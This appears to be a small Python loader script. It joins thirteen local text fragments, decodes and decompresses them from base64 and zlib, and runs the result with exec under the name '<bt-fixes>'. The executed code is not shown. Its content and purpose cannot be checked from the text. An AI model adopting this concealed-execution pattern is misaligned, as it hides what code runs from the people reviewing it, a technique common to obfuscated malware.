import base64
import zlib
from pathlib import Path

root = Path(__file__).resolve().parent
payload = "".join(
    (root / f"bt_fix_part_{index:02}.txt").read_text().strip()
    for index in range(13)
)
source = zlib.decompress(base64.b64decode(payload))
exec(compile(source, "<bt-fixes>", "exec"))
